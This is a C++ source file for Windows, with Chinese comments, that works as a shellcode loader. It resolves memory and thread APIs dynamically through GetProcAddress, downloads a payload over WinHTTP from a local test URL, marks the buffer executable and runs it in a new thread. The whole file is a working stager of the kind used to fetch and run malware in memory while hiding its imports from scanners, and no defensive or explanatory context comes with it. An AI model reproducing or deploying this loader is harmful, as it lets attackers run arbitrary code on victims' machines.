#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <string>
#include "http_request.hpp"

int main(int argc, char* argv[])
{
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");

    if (hKernel32 == NULL) {
        std::cerr << "Failed to get handle to kernel32.dll" << std::endl;
        return 1;
    }

    // 通过 GetProcAddress 获取函数指针
    auto pVirtualAlloc = reinterpret_cast<LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD)>(GetProcAddress(hKernel32, "VirtualAlloc"));
    auto pVirtualFree = reinterpret_cast<BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD)>(GetProcAddress(hKernel32, "VirtualFree"));
    auto pVirtualProtect = reinterpret_cast<BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD)>(GetProcAddress(hKernel32, "VirtualProtect"));
    auto pCreateThread = reinterpret_cast<HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)>(GetProcAddress(hKernel32, "CreateThread"));
    auto pWaitForSingleObject = reinterpret_cast<DWORD(WINAPI*)(HANDLE, DWORD)>(GetProcAddress(hKernel32, "WaitForSingleObject"));
    auto pCloseHandle = reinterpret_cast<BOOL(WINAPI*)(HANDLE)>(GetProcAddress(hKernel32, "CloseHandle"));

    HINTERNET hSession = nullptr, hConnect = nullptr, hRequest = nullptr;
    DWORD dwDataSize = 0;
    DWORD dwSize = sizeof(dwDataSize);

    std::wstring url = L"http://127.0.0.1:8181/test.1123";
    std::wstring host, path;
    INTERNET_PORT port;

    if (!HttpRequest::ParseURL(url, host, port, path)) {
        std::cerr << "Failed to parse URL" << std::endl;
        return 1;
    }

    hSession = HttpRequest::OpenSession();
    if (hSession)
    {
        hConnect = HttpRequest::ConnectToServer(hSession, host, port);
        if (hConnect)
        {
            hRequest = HttpRequest::OpenRequest(hConnect, path);
            if (hRequest)
            {
                if (HttpRequest::SendRequest(hRequest) && HttpRequest::ReceiveResponse(hRequest))
                {
                    // 获取内容长度
                    if (WinHttpQueryHeaders(hRequest,
                        WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX,
                        &dwDataSize,
                        &dwSize,
                        NULL))
                    {
                        // 根据内容长度动态分配内存
                        LPVOID lpAddress = pVirtualAlloc(NULL, dwDataSize, MEM_COMMIT, PAGE_READWRITE);
                        if (lpAddress)
                        {
                            // 读取响应到内存
                            if (HttpRequest::ReadResponse(hRequest, lpAddress, dwDataSize))
                            {
                                DWORD ulOldProtect;
                                if (pVirtualProtect(lpAddress, dwDataSize, PAGE_EXECUTE_READ, &ulOldProtect))
                                {
                                    HANDLE hThread = pCreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(lpAddress), NULL, 0, NULL);
                                    pWaitForSingleObject(hThread, INFINITE);
                                    pCloseHandle(hThread);
                                }
                            }
                            // 释放读写内存
                            pVirtualFree(lpAddress, 0, MEM_RELEASE);
                        }
                    }
                }
            }
        }
    }

    // 关闭所有句柄
    HttpRequest::CloseHandles(hRequest, hConnect, hSession);

    return 0;
}